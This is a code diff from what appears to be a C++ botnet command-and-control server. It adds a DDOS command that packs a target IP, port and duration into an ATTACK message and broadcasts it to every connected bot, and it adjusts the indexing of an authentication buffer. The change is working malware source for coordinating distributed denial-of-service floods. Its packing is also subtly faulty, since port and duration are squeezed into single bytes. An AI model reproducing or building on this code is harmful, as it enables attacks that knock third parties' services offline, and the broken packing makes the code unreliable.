@@ -95,15 +95,34 @@ int main() {
 			std::cout << "Connected clients: " << nClientCount << std::endl;
 			break;
 		case DDOS:
-			{
-				std::vector<std::string> splittedCmd = split(cmd, ' ');
-				std::string ip = splittedCmd[1];
-				std::string sPort = splittedCmd[2];
-				std::string sTime = splittedCmd[3];
+		{
+			std::vector<std::string> splittedCmd = split(cmd, ' ');
+			std::string ip = splittedCmd[1];
+			std::string sPort = splittedCmd[2];
+			std::string sTime = splittedCmd[3];
 
-				int nPort = stoi(sPort);
-				int nTime = stoi(sTime);
+			UINT nPort = stoi(sPort);
+			UINT nTime = stoi(sTime);
+			UINT nIPLength = ip.size();
+
+			UINT nBufferSize = 0;
+
+			char buffer[1024];
+			buffer[nBufferSize] = ATTACK;
+			nBufferSize++;
+			buffer[nBufferSize] = nIPLength;
+			nBufferSize++;
+			memcpy(&buffer[nBufferSize], ip.data(), nIPLength);
+			nBufferSize += nIPLength;
+			buffer[nBufferSize] = nPort;
+			nBufferSize++;
+			buffer[nBufferSize] = nTime;
+			nBufferSize++;
+
+			for (std::pair<std::string, SOCKET> client : clients) {
+				send(client.second, buffer, nBufferSize, 0);
 			}
+		}
 			break;
 		case CLEAR:
 			std::cout << "\033[2J\033[1;1H" << std::endl;
@@ -216,7 +235,7 @@ void ClientThread(SOCKET sock, std::string ip) {
 		std::string code = GenRandStr(16);
 		char authBuff[1024];
 		int nBuffSize = 0;
-		authBuff[0] = AUTH;
+		authBuff[nBuffSize] = AUTH;
 		nBuffSize++;
 		memcpy(&authBuff[nBuffSize], code.data(), code.size());
 		nBuffSize += code.size();
